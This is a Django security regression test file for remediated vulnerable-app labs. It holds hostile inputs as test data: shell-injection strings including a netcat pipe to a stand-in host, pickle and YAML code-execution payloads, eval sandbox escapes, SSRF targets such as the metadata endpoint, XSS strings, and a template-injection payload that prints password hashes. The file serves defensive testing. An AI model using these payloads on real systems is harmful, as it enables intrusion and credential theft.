"""Security regression tests for the remediated labs.

Deterministic and offline: DNS resolution and network connections are mocked, starting a
process makes a test fail, and the "malicious" payloads only try to call
record_payload_execution(), a harmless function that records that it ran.
"""
import base64
import hashlib
import ipaddress
import os
import secrets
import socket
from pathlib import Path
from unittest import mock

import jwt
from django.conf import settings
from django.contrib import admin
from django.contrib.auth.hashers import check_password, make_password
from django.contrib.auth.models import User
from django.core import signing
from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import Client, SimpleTestCase, TestCase, override_settings

from introduction import playground_review, safety, utility, views
from introduction.admin import HashedPasswordAdmin
from introduction.mitre import csrf_lab_jwt_key
from introduction.models import Blogs, CF_user, CSRF_user_tbl

PAYLOAD_EXECUTIONS = []


def record_payload_execution(*args):
    """What an injected payload tries to call. If it ever runs, the payload was executed."""
    PAYLOAD_EXECUTIONS.append(args)
    return 0


# A pickle (protocol 0) whose loading calls record_payload_execution("pickle payload ran"):
# exactly how a __reduce__-based remote code execution payload works.
EVIL_PICKLE = b"cintroduction.tests\nrecord_payload_execution\n(S'pickle payload ran'\ntR."
EVIL_YAML = b"!!python/object/apply:introduction.tests.record_payload_execution ['yaml payload ran']\n"

PROCESS_STARTERS = ("subprocess.Popen", "subprocess.run", "subprocess.call",
                    "subprocess.check_output", "os.system", "os.popen")


def fake_getaddrinfo(names):
    """Offline resolver: IP literals resolve to themselves, names from the `names` dict."""
    def resolve(host, port, *args, **kwargs):
        try:
            addresses = [str(ipaddress.ip_address(host))]
        except ValueError:
            if host not in names:
                raise socket.gaierror(socket.EAI_NONAME, "Name or service not known")
            addresses = names[host]
        return [(socket.AF_INET6 if ":" in a else socket.AF_INET, socket.SOCK_STREAM, 6, "", (a, port or 0))
                for a in addresses]
    return resolve


class NoProcessMixin:
    """Every way of starting a process fails the test if it is called."""

    def setUp(self):
        super().setUp()
        PAYLOAD_EXECUTIONS.clear()
        for target in PROCESS_STARTERS:
            patcher = mock.patch(target, side_effect=AssertionError(f"{target} must never be called"))
            patcher.start()
            self.addCleanup(patcher.stop)


class LoggedInTestCase(NoProcessMixin, TestCase):
    def setUp(self):
        super().setUp()
        self.client.force_login(User.objects.create_user("tester", password=secrets.token_hex(16)))


# ----------------------------------------------------------------------------- command injection

class CommandInjectionTests(LoggedInTestCase):
    @mock.patch("introduction.safety.socket.getaddrinfo", fake_getaddrinfo({"example.com": ["93.184.216.34"]}))
    def test_dns_lab_resolves_a_valid_domain_without_any_process(self):
        response = self.client.post("/cmd_lab", {"domain": "example.com", "os": "linux"})
        self.assertContains(response, "93.184.216.34")
        self.assertContains(response, "no shell")

    def test_dns_lab_injection_is_explained_not_executed(self):
        for payload in ("example.com; id", "example.com && cat /etc/passwd", "$(id)", "example.com | nc evil 4444"):
            response = self.client.post("/cmd_lab", {"domain": payload, "os": "linux"})
            self.assertContains(response, "Command NOT executed (simulation)")

    def test_dns_lab_rejects_option_injection(self):
        response = self.client.post("/cmd_lab", {"domain": "-f/etc/passwd", "os": "win"})
        self.assertContains(response, "Rejected: enter a valid domain name or IP address.")

    def test_port_scan_lab_never_runs_nmap_and_escapes_html(self):
        response = self.client.post("/mitre/17/lab/api", {"ip": "<img src=x onerror=alert(1)>; id"})
        data = response.json()
        self.assertIn("Command NOT executed (simulation).", data["ports"])
        self.assertNotIn("<img", data["raw_res"])
        response = self.client.post("/mitre/17/lab/api", {"ip": "192.0.2.10"})
        self.assertIn("Simulation: no scan was run.", response.json()["ports"])


class TargetValidationTests(SimpleTestCase):
    def test_parse_target(self):
        self.assertEqual(safety.parse_target("example.com"), "example.com")
        self.assertEqual(safety.parse_target(" 10.0.0.1 "), "10.0.0.1")
        for bad in ("-oX", "exa mple.com", "a" * 64 + ".com", "", "example..com", "http://example.com"):
            self.assertIsNone(safety.parse_target(bad), bad)

    def test_shell_metacharacters_detected(self):
        self.assertEqual(safety.shell_metacharacters_in("a;b|c"), [";", "|"])
        self.assertEqual(safety.shell_metacharacters_in("example.com"), [])


# ----------------------------------------------------------------------------- deserialization

class InsecureDeserializationTests(LoggedInTestCase):
    def test_first_visit_sets_a_signed_json_token_not_a_pickle(self):
        response = self.client.get("/insec_des_lab")
        token = response.cookies["token"].value
        self.assertEqual(signing.loads(token, salt=views.INSEC_DES_TOKEN_SALT), {"admin": 0})

    def test_malicious_pickle_cookie_is_rejected_and_never_executed(self):
        self.client.cookies["token"] = base64.b64encode(EVIL_PICKLE).decode()
        response = self.client.get("/insec_des_lab")
        self.assertContains(response, "Token rejected")
        self.assertEqual(PAYLOAD_EXECUTIONS, [])

    def test_tampered_admin_flag_is_rejected(self):
        token = signing.dumps({"admin": 0}, salt=views.INSEC_DES_TOKEN_SALT)
        payload, rest = token.split(":", 1)
        forged = base64.urlsafe_b64encode(b'{"admin":1}').decode().rstrip("=") + ":" + rest
        self.client.cookies["token"] = forged
        self.assertContains(self.client.get("/insec_des_lab"), "Token rejected")

    def test_server_signed_admin_token_still_works(self):
        self.client.cookies["token"] = signing.dumps({"admin": 1}, salt=views.INSEC_DES_TOKEN_SALT)
        self.assertContains(self.client.get("/insec_des_lab"), "Welcome Admin")


class YamlDeserializationTests(LoggedInTestCase):
    def test_python_object_tag_is_rejected_and_never_executed(self):
        upload = SimpleUploadedFile("evil.yaml", EVIL_YAML)
        response = self.client.post("/a9_lab", {"file": upload})
        self.assertContains(response, "Python-specific tag")
        self.assertEqual(PAYLOAD_EXECUTIONS, [])

    def test_plain_yaml_is_still_parsed(self):
        upload = SimpleUploadedFile("ok.yaml", b"name: pygoat\nitems: [1, 2]\n")
        response = self.client.post("/a9_lab", {"file": upload})
        self.assertContains(response, "pygoat")


# ----------------------------------------------------------------------------- SSRF

NAMES = {
    "localhost": ["127.0.0.1"],
    "2130706433": ["127.0.0.1"],                 # decimal form of 127.0.0.1
    "internal.example": ["192.168.1.10"],       # public name pointing to a private address
    "mixed.example": ["93.184.216.34", "10.0.0.1"],
    "example.com": ["93.184.216.34"],
}


@mock.patch("introduction.safety.socket.getaddrinfo", fake_getaddrinfo(NAMES))
class SsrfPolicyTests(SimpleTestCase):
    BLOCKED = [
        "https://localhost/", "https://127.0.0.1/ssrf_target", "https://2130706433/",
        "https://10.0.0.5/", "https://172.16.0.1/", "https://192.168.0.1/", "https://100.64.0.1/",
        "https://169.254.169.254/latest/meta-data/", "https://[::1]/", "https://[::ffff:127.0.0.1]/",
        "https://[fd00::1]/", "https://0.0.0.0/", "https://internal.example/", "https://mixed.example/",
        "http://example.com/", "file:///etc/passwd", "gopher://example.com/", "ftp://example.com/",
        "https://user:pass@example.com/", "https://example.com:8443/", "https://unknown.invalid/", "",
    ]

    def test_internal_and_non_https_destinations_are_blocked(self):
        for url in self.BLOCKED:
            with self.subTest(url=url):
                with self.assertRaises(safety.OutboundRequestBlocked):
                    safety.resolve_public_destination(url)

    def test_public_https_destination_is_allowed_and_pinned(self):
        parts, host, port, address = safety.resolve_public_destination("https://example.com/path?q=1")
        self.assertEqual((host, port, str(address)), ("example.com", 443, "93.184.216.34"))

    @mock.patch("introduction.safety.urllib3.HTTPSConnectionPool")
    def test_fetch_connects_to_the_validated_ip_and_does_not_follow_redirects(self, pool_class):
        pool = pool_class.return_value
        pool.urlopen.return_value = mock.Mock(status=302, headers={"Location": "https://10.0.0.1/"})
        status, text = safety.fetch_public_url("https://example.com/")
        self.assertEqual(status, 302)
        self.assertIn("not followed", text)
        args, kwargs = pool_class.call_args
        self.assertEqual(args[0], "93.184.216.34")
        self.assertEqual(kwargs["server_hostname"], "example.com")
        self.assertEqual(kwargs["cert_reqs"], "CERT_REQUIRED")
        self.assertIs(pool.urlopen.call_args.kwargs["redirect"], False)


class SsrfViewTests(LoggedInTestCase):
    @mock.patch("introduction.safety.urllib3.HTTPSConnectionPool", side_effect=AssertionError("no connection"))
    @mock.patch("introduction.safety.socket.getaddrinfo", fake_getaddrinfo(NAMES))
    def test_internal_target_is_blocked_before_any_connection(self, _pool):
        response = self.client.post("/ssrf_lab2", {"url": "https://localhost/ssrf_target"})
        self.assertContains(response, "Blocked by the outbound request policy")


# ----------------------------------------------------------------------------- JWT signing key

class CsrfLabJwtKeyTests(SimpleTestCase):
    def test_key_is_derived_not_committed(self):
        key = csrf_lab_jwt_key()
        self.assertEqual(len(key), 64)
        self.assertNotEqual(key, settings.SECRET_KEY)
        self.assertEqual(key, csrf_lab_jwt_key())  # stable: identical in every worker

    def test_key_changes_with_the_environment_secret(self):
        with override_settings(SECRET_KEY=secrets.token_hex(50)):
            other = csrf_lab_jwt_key()
        self.assertNotEqual(other, csrf_lab_jwt_key())


class CsrfLabLoginTests(LoggedInTestCase):
    def setUp(self):
        super().setUp()
        self.password = secrets.token_hex(8)
        CSRF_user_tbl.objects.create(username="lab_user", password=make_password(self.password), balance=100)

    def test_correct_password_logs_in_with_a_derived_key_token(self):
        response = self.client.post("/mitre/9/lab/login", {"username": "lab_user", "password": self.password})
        self.assertRedirects(response, "/mitre/9/lab/transaction", fetch_redirect_response=False)
        token = response.cookies["auth_cookiee"].value
        self.assertEqual(jwt.decode(token, csrf_lab_jwt_key(), algorithms=["HS256"])["username"], "lab_user")

    def test_wrong_password_and_legacy_md5_value_are_rejected(self):
        response = self.client.post("/mitre/9/lab/login", {"username": "lab_user", "password": "wrong"})
        self.assertNotIn("auth_cookiee", response.cookies)
        legacy = hashlib.md5(self.password.encode(), usedforsecurity=False).hexdigest()  # old storage format
        CSRF_user_tbl.objects.filter(username="lab_user").update(password=legacy)
        response = self.client.post("/mitre/9/lab/login", {"username": "lab_user", "password": self.password})
        self.assertNotIn("auth_cookiee", response.cookies)

    def test_token_forged_with_another_key_is_rejected(self):
        forged = jwt.encode({"username": "lab_user"}, secrets.token_hex(32), algorithm="HS256")
        self.client.cookies["auth_cookiee"] = forged
        response = self.client.get("/mitre/9/lab/transaction")
        self.assertRedirects(response, "/mitre/9/lab/login", fetch_redirect_response=False)


# ----------------------------------------------------------------------------- password hashing

class CryptoFailureLabTests(LoggedInTestCase):
    def setUp(self):
        super().setUp()
        self.password = secrets.token_hex(8)
        CF_user.objects.create(username="cf_alex_user", password=make_password(self.password), password2="")

    def test_correct_password_logs_in(self):
        response = self.client.post("/cryptographic_failure/lab", {"username": "cf_alex_user", "password": self.password})
        self.assertContains(response, "cf_alex_user")

    def test_wrong_password_does_not_log_in(self):
        response = self.client.post("/cryptographic_failure/lab", {"username": "cf_alex_user", "password": "wrong"})
        self.assertNotContains(response, "cf_alex_user")


class AdminPasswordHashingTests(TestCase):
    def test_admin_stores_a_salted_hash_and_keeps_existing_hashes(self):
        model_admin = HashedPasswordAdmin(CSRF_user_tbl, admin.site)
        obj = CSRF_user_tbl(username="admin_created", password="typed-in-admin")
        model_admin.save_model(None, obj, None, False)
        self.assertTrue(obj.password.startswith("pbkdf2_sha256$"))
        self.assertTrue(check_password("typed-in-admin", obj.password))
        already_hashed = obj.password
        model_admin.save_model(None, obj, None, True)
        self.assertEqual(obj.password, already_hashed)


# ----------------------------------------------------------------------------- earlier phases

class EarlierRemediationTests(SimpleTestCase):
    def test_secret_key_comes_from_the_environment(self):
        self.assertEqual(settings.SECRET_KEY, os.environ["DJANGO_SECRET_KEY"])

    def test_auth_lab3_demo_hashes_match_the_published_demo_passwords(self):
        for number in range(1, 5):
            expected = hashlib.sha256(f"Hash{number}".encode()).hexdigest()
            self.assertEqual(views.USER_A7_LAB3[f"User{number}"]["password"], expected)

    def test_sql_lab_demo_passwords_are_random(self):
        values = list(views.SQL_LAB_DEMO_PASSWORDS.values())
        self.assertEqual(len(set(values)), 3)
        for value in values:
            self.assertRegex(value, r"^[0-9a-f]{32}$")

    def test_image_expression_allowlist_rejects_code(self):
        for expression in ("__import__('os').system('id')", "r.__class__", "exec('x')"):
            with self.assertRaises(views.UnsupportedImageExpression):
                views.parse_image_expression(expression)


# ----------------------------------------------------------------------------- code injection (eval)

CODE_PAYLOADS = (
    "__import__('os').system('id')",
    "open('/etc/passwd').read()",
    "(lambda:0).__globals__",
    "__import__('introduction.tests').tests.record_payload_execution('eval payload ran')",
    "().__class__.__base__.__subclasses__()",
    "exec('import os')",
    "eval('1+1')",
    "globals()",
    "[x for x in range(3)]",
    "1 if True else 2",
    "'a' * 10",
    "True + 1",
    "1j * 1j",
    "9 ** 9 ** 9",
    "10 ** 1000",
    "2 ** 0.5 ** -999",
    "1; import os",
)


class SafeCalculatorTests(NoProcessMixin, SimpleTestCase):
    def test_arithmetic_still_works(self):
        cases = {"1 + 1": 2, "5 * 5": 25, "7 * 7": 49, "(2 + 3) * 4 / 2": 10.0, "2 ** 10": 1024,
                 "-5 % 3": 1, "7 // 2": 3, "1.5 * 2": 3.0, "-(3 - 10)": 7}
        for expression, expected in cases.items():
            self.assertEqual(safety.safe_calculate(expression), expected, expression)

    def test_code_payloads_are_rejected_and_never_executed(self):
        for payload in CODE_PAYLOADS:
            with self.subTest(payload=payload):
                with self.assertRaises(safety.UnsafeExpression):
                    safety.safe_calculate(payload)
        self.assertEqual(PAYLOAD_EXECUTIONS, [])

    def test_division_by_zero_is_a_normal_error(self):
        with self.assertRaises(ZeroDivisionError):
            safety.safe_calculate("1 / 0")


class EvalLabViewTests(LoggedInTestCase):
    def test_cmd_lab2_explains_instead_of_executing(self):
        for payload in CODE_PAYLOADS[:4]:
            response = self.client.post("/cmd_lab2", {"val": payload})
            self.assertContains(response, "Not evaluated (simulation)")
        self.assertEqual(PAYLOAD_EXECUTIONS, [])
        self.assertContains(self.client.post("/cmd_lab2", {"val": "7 * 7"}), "49")

    def test_mitre_lab25_explains_instead_of_executing(self):
        for payload in CODE_PAYLOADS[:4]:
            data = self.client.post("/mitre/25/lab/api", {"expression": payload}).json()
            self.assertFalse(data["evaluated"])
            self.assertIn("Not evaluated (simulation)", data["result"])
        self.assertEqual(PAYLOAD_EXECUTIONS, [])
        self.assertEqual(self.client.post("/mitre/25/lab/api", {"expression": "1 + 1"}).json(),
                         {"result": 2, "evaluated": True})
        self.assertFalse(self.client.post("/mitre/25/lab/api", {"expression": "1/0"}).json()["evaluated"])


# ----------------------------------------------------------------------------- SSRF output rendering

class SsrfOutputEscapingTests(LoggedInTestCase):
    HOSTILE = "<script>alert(1)</script><img src=x onerror=alert(1)>"

    @mock.patch("introduction.views.fetch_public_url", return_value=(200, HOSTILE))
    def test_remote_html_is_rendered_as_text(self, _fetch):
        response = self.client.post("/ssrf_lab2", {"url": "https://example.com/"})
        self.assertContains(response, "&lt;script&gt;alert(1)&lt;/script&gt;")
        self.assertContains(response, "&lt;img src=x onerror=alert(1)&gt;")
        self.assertNotContains(response, "<script>alert(1)</script>")
        self.assertNotContains(response, "<img src=x onerror=alert(1)>")


# ----------------------------------------------------------------------------- B3: playgrounds

APP_DIR = Path(views.__file__).resolve().parent
PLAYGROUND_MODULES = [APP_DIR / p for p in ("playground/A9/main.py", "playground/A9/api.py",
                                             "playground/A9/archive.py", "playground/A6/utility.py",
                                             "playground/ssrf/main.py", "utility.py", "apis.py")]
MALICIOUS_CODE = ("from introduction.tests import record_payload_execution\n"
                  "record_payload_execution('playground code ran')\n")
ORIGINAL_API = (APP_DIR / "playground/A9/api.py").read_text(encoding="utf8")
FIXED_API = ORIGINAL_API.replace(" and password {password}", "")
REFERENCE_LOG = (APP_DIR / "playground/A9/archive.py").read_text(encoding="utf8").split("# " + "=" * 38)[1]
STUB_LOG = (APP_DIR / "playground/A9/main.py").read_text(encoding="utf8")
REFERENCE_A6 = (APP_DIR / "playground/A6/soln.py").read_text(encoding="utf8")

VULNERABLE_SSRF_VIEW = '''
def ssrf_lab(request):
    if request.method == "GET":
        return render(request, "Lab/ssrf/ssrf_lab.html", {"blog": "Read Blog About SSRF"})
    else:
        file = request.POST["blog"]
        try:
            dirname = os.path.dirname(__file__)
            filename = os.path.join(dirname, file)
            file = open(filename, "r")
            data = file.read()
            return render(request, "Lab/ssrf/ssrf_lab.html", {"blog": data})
        except:
            return render(request, "Lab/ssrf/ssrf_lab.html", {"blog": "No blog found"})
'''
MAPPING_SSRF_VIEW = '''
BLOGS = {"blog1": "blogs/blog1.txt", "blog2": "blogs/blog2.txt", "blog3": "blogs/blog3.txt", "blog4": "blogs/blog4.txt"}
def ssrf_lab(request):
    name = request.POST["blog"]
    path = BLOGS.get(name)
    if path is None:
        return render(request, "Lab/ssrf/ssrf_lab.html", {"blog": "No blog found"})
    with open(os.path.join(os.path.dirname(__file__), path)) as file:
        return render(request, "Lab/ssrf/ssrf_lab.html", {"blog": file.read()})
'''
ALLOWLIST_SSRF_VIEW = '''
ALLOWED = ["blog1.txt", "blog2.txt", "blog3.txt", "blog4.txt"]
def ssrf_lab(request):
    file = request.POST.get("blog")
    if file not in ALLOWED:
        return render(request, "Lab/ssrf/ssrf_lab.html", {"blog": "No blog found"})
    with open(os.path.join(os.path.dirname(__file__), "blogs", file)) as f:
        return render(request, "Lab/ssrf/ssrf_lab.html", {"blog": f.read()})
'''
HTML_WITH_PATHS = "\n".join(f'<input type="hidden" name="blog" value="templates/Lab/ssrf/blogs/blog{i}.txt">'
                            for i in range(1, 5))
HTML_WITH_IDS = "\n".join(f'<input type="hidden" name="blog" value="blog{i}">' for i in range(1, 5))


def snapshot(paths):
    return {str(p): hashlib.sha256(p.read_bytes()).hexdigest() for p in paths}


class PlaygroundCodeIsDataTests(LoggedInTestCase):
    def setUp(self):
        super().setUp()
        self.before = snapshot(PLAYGROUND_MODULES)

    def tearDown(self):
        self.assertEqual(snapshot(PLAYGROUND_MODULES), self.before, "an application module was modified")
        self.assertEqual(PAYLOAD_EXECUTIONS, [], "learner code was executed")
        super().tearDown()

    def test_a9_malicious_code_is_never_written_or_executed(self):
        response = self.client.post("/2021/discussion/A9/api", {"log_code": MALICIOUS_CODE, "api_code": MALICIOUS_CODE})
        self.assertEqual(response.status_code, 200)
        self.assertFalse(response.json()["passed"])

    def test_a9_reference_solution_passes(self):
        data = self.client.post("/2021/discussion/A9/api", {"log_code": REFERENCE_LOG, "api_code": FIXED_API}).json()
        self.assertTrue(data["passed"], data["logs"])
        self.assertIn("INFO | GET request | GET request", data["logs"])
        self.assertIn("✅ Secure logging implemented.", data["logs"])

    def test_a9_password_logging_and_empty_logger_are_flagged(self):
        data = self.client.post("/2021/discussion/A9/api", {"log_code": REFERENCE_LOG, "api_code": ORIGINAL_API}).json()
        self.assertFalse(data["passed"])
        self.assertTrue(any("logs sensitive data (password)" in line for line in data["logs"]))
        self.assertTrue(any("S3cret!" in line for line in data["logs"]))  # the simulated log shows the leak
        data = self.client.post("/2021/discussion/A9/api", {"log_code": STUB_LOG, "api_code": FIXED_API}).json()
        self.assertTrue(any("Log.info() does nothing" in line for line in data["logs"]))

    def test_a9_invalid_code_is_reported(self):
        response = self.client.post("/2021/discussion/A9/api", {"log_code": "class Log(:", "api_code": FIXED_API})
        self.assertEqual(response.status_code, 400)
        self.assertIn("syntax error", response.json()["logs"][0])

    def test_a6_save_reviews_without_writing(self):
        data = self.client.post("/2021/discussion/A6/api2", {"code": REFERENCE_A6}).json()
        self.assertTrue(data["passed"], data["feedback"])
        self.client.post("/2021/discussion/A6/api2", {"code": MALICIOUS_CODE})
        data = self.client.post("/2021/discussion/A6/api2", {"code": "import requests\ndef check_vul(m):\n"
                                                                      "    return requests.get('https://pypi.org/pypi/x/1/json')"}).json()
        self.assertIn("⚠️ Add a timeout to requests.get(): a slow server must not block the check.", data["feedback"])

    @mock.patch("introduction.apis.check_vuln", return_value=[[{"id": "PYSEC-0000-0"}]])
    def test_a6_run_uses_the_reference_implementation(self, check_vuln):
        data = self.client.post("/2021/discussion/A6/api", {"code": MALICIOUS_CODE}).json()
        self.assertEqual(data["vulns"], [[{"id": "PYSEC-0000-0"}]])
        check_vuln.assert_called_once()

    def test_ssrf_exercise_static_review(self):
        def check(python_code, html_code):
            return self.client.post("/api/ssrf", {"python_code": python_code, "html_code": html_code}).json()
        self.assertIn("not secure", check(VULNERABLE_SSRF_VIEW, HTML_WITH_IDS)["message"])
        self.assertIn("still sends file paths", check(MAPPING_SSRF_VIEW, HTML_WITH_PATHS)["message"])
        self.assertEqual(check(MAPPING_SSRF_VIEW, HTML_WITH_IDS).get("passed"), 1)
        self.assertEqual(check(ALLOWLIST_SSRF_VIEW, HTML_WITH_IDS).get("passed"), 1)
        self.assertNotIn("passed", check(MALICIOUS_CODE, HTML_WITH_IDS))


class PlaygroundAccessControlTests(NoProcessMixin, TestCase):
    ENDPOINTS = ("/2021/discussion/A9/api", "/2021/discussion/A6/api", "/2021/discussion/A6/api2",
                 "/2021/discussion/A7/api")

    def test_anonymous_users_are_rejected(self):
        before = snapshot(PLAYGROUND_MODULES)
        for url in self.ENDPOINTS:
            response = self.client.post(url, {"code": MALICIOUS_CODE, "log_code": MALICIOUS_CODE})
            self.assertEqual(response.status_code, 302, url)
            self.assertIn("login", response["Location"])
        self.assertEqual(self.client.post("/api/ssrf", {"python_code": MALICIOUS_CODE}).status_code, 401)
        self.assertEqual(snapshot(PLAYGROUND_MODULES), before)

    def test_csrf_token_is_required(self):
        client = Client(enforce_csrf_checks=True)
        client.force_login(User.objects.create_user("csrf_tester", password=secrets.token_hex(16)))
        body = {"log_code": REFERENCE_LOG, "api_code": FIXED_API}
        self.assertEqual(client.post("/2021/discussion/A9/api", body).status_code, 403)
        client.get("/2021/discussion/A9")  # the page sets the csrftoken cookie (logout form in base.html)
        token = client.cookies["csrftoken"].value
        self.assertEqual(client.post("/2021/discussion/A9/api", body, HTTP_X_CSRFTOKEN=token).status_code, 200)


# ----------------------------------------------------------------------------- B3: SSTI

SSTI_PAYLOAD = ("{% load log %}{% get_admin_log 5 as log %}{% for e in log %}"
                "{{ e.user.get_username }} : {{ e.user.password }}{% endfor %} {{ request.user.username }}")


def template_files():
    return sorted(str(p) for p in (APP_DIR / "templates").rglob("*") if p.is_file())


class SstiLabTests(LoggedInTestCase):
    def test_post_is_stored_as_data_and_never_rendered_as_a_template(self):
        before = template_files()
        response = self.client.post("/ssti/lab", {"blog": SSTI_PAYLOAD})
        self.assertEqual(response.status_code, 302)
        self.assertEqual(template_files(), before, "a template file was created")
        blog = Blogs.objects.get(author__username="tester")
        self.assertEqual(blog.content, SSTI_PAYLOAD)
        page = self.client.get(f"/ssti/blog/{blog.blog_id}")
        self.assertContains(page, "{{ e.user.password }}")      # shown as text: not interpreted
        self.assertContains(page, "{% load log %}")
        self.assertContains(page, "Template injection analysis")
        self.assertContains(page, "prints password hashes")

    def test_blog_of_another_user_is_not_visible(self):
        other = User.objects.create_user("other_author", password=secrets.token_hex(16))
        Blogs.objects.create(author=other, blog_id="0123456789ab", content="private")
        self.assertEqual(self.client.get("/ssti/blog/0123456789ab").status_code, 404)

    def test_legacy_template_path_is_not_rendered(self):
        self.assertEqual(self.client.get("/ssti/blog/9d73d120683d").status_code, 404)


class ReadOnlyApplicationTests(SimpleTestCase):
    def test_dockerfile_never_makes_code_or_templates_writable(self):
        dockerfile = (APP_DIR.parent / "Dockerfile").read_text(encoding="utf8")
        chown_targets = [t for line in dockerfile.splitlines() if "chown" in line
                         for t in line.split() if t.startswith("/app")]
        self.assertEqual(chown_targets, ["/app"])  # only the directory itself (SQLite + journal)
        self.assertNotRegex(dockerfile, r"chmod\s+(-R\s+)?(0?777|0?666|[a-z]*\+w)")
        self.assertRegex(dockerfile, r"(?m)^USER pygoat$")

    def test_no_application_code_writes_python_modules(self):
        self.assertFalse(hasattr(utility, "ssrf_code_converter"))
        for module in ("apis.py", "utility.py", "views.py", "mitre.py", "playground_review.py", "safety.py"):
            source = (APP_DIR / module).read_text(encoding="utf8")
            self.assertNotIn("playground/A9/main.py\"", source.replace("'", '"'), module)
            self.assertNotRegex(source, r"open\([^)]*\.py[\"'][^)]*[\"'][wa]", module)

    def test_reviewer_never_executes(self):
        for code in (MALICIOUS_CODE, "__import__('os').system('id')"):
            playground_review.review_dependency_checker(code)
        self.assertEqual(PAYLOAD_EXECUTIONS, [])
